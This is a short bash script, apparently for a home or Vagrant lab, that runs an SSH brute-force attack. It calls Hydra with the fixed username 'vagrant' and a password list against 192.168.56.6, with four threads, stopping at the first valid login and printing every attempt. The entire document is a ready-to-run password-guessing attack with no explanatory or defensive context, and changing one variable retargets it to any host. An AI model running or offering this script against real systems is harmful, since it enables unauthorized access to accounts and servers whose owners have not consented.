#!/bin/bash
# SSH Brute-force Script using Hydra

TARGET_IP="192.168.56.6"
USERNAME="vagrant"
PASSWORD_LIST="passwords.txt"

echo "[*] Starting SSH brute-force attack on $TARGET_IP..."
hydra -l "$USERNAME" -P "$PASSWORD_LIST" ssh://"$TARGET_IP" -t 4 -f -V
